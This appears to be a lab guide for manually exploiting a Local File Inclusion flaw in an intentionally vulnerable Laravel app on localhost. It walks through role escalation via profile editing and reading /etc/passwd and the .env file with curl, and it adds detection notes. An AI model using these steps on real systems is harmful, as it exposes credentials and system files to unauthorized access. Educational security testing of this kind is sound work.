# Manual LFI Testing Guide

This guide explains how to manually test the Local File Inclusion (LFI) vulnerability in the lab environment.

## Prerequisites

1. **Application is running**: `http://localhost:8000`
2. **User account**: Any registered user
3. **Role escalation**: Change role to "Administrador" or "Programador"

## Step-by-Step Testing

### 1. Access the Application
```
http://localhost:8000
```

### 2. Login with any user account
- Register a new account or use existing credentials
- Complete the login process

### 3. Elevate Privileges (Role Escalation)
1. Go to your user profile
2. Edit your profile information
3. Change your role to "Administrador" or "Programador"
4. Save the changes

### 4. Access the LFI Interface
1. Navigate to the admin panel
2. Look for "Sistema" in the sidebar menu
3. Click on "Visualizador de Arquivos"

### 5. Test File Reading
Try these file paths in the input field:

#### System Files
- `/etc/passwd` - User accounts
- `/proc/version` - Kernel version
- `/etc/hosts` - Hostname mapping
- `/proc/cpuinfo` - CPU information
- `/proc/meminfo` - Memory information

#### Application Files
- `/var/www/html/storage/logs/laravel.log` - Laravel logs
- `/var/www/html/.env` - Environment variables

### 6. API Testing (Advanced)
If you have access to the API endpoint, test with curl:

```bash
# Test with Laravel logs (default)
curl "http://localhost:8000/admin/system/log?file=/var/www/html/storage/logs/laravel.log"

# Test with system files
curl "http://localhost:8000/admin/system/log?file=/etc/passwd"

# Test with system info
curl "http://localhost:8000/admin/system/log?file=/proc/version"
```

## Expected Results

### Successful Response (JSON)
```json
{
    "file": "/var/www/html/storage/logs/laravel.log",
    "content": "[2025-07-07 01:46:26] local.ERROR: View [admin.layouts.app] not found...",
    "size": 106858,
    "success": true
}
```

### File Not Found Response
```json
{
    "error": "File not found: /nonexistent/file",
    "suggestions": [
        "/etc/passwd",
        "/proc/version",
        "/etc/hosts",
        "/var/www/html/storage/logs/laravel.log"
    ],
    "success": false
}
```

## Troubleshooting

### Issue: 404 Not Found
- **Cause**: Not authenticated or wrong URL
- **Solution**: Login first and use correct path

### Issue: Access Denied
- **Cause**: Insufficient privileges
- **Solution**: Change role to "Administrador" or "Programador"

### Issue: File Not Found
- **Cause**: File doesn't exist in container
- **Solution**: Try suggested alternative files

## Security Implications

This vulnerability demonstrates:
1. **Information Disclosure**: Reading sensitive system files
2. **Reconnaissance**: Gathering system information
3. **Privilege Escalation**: Accessing admin-only features
4. **Log Analysis**: Reading application logs

## Detection

Monitor these logs for LFI attempts:
- Laravel logs: `storage/logs/laravel.log`
- Web server logs: Check Docker container logs
- Application access logs: Admin panel activity

## Notes

- This is an intentionally vulnerable environment for educational purposes
- All file access attempts are logged
- The vulnerability allows reading any file accessible to the web server process
- Real-world applications should implement proper input validation and access controls 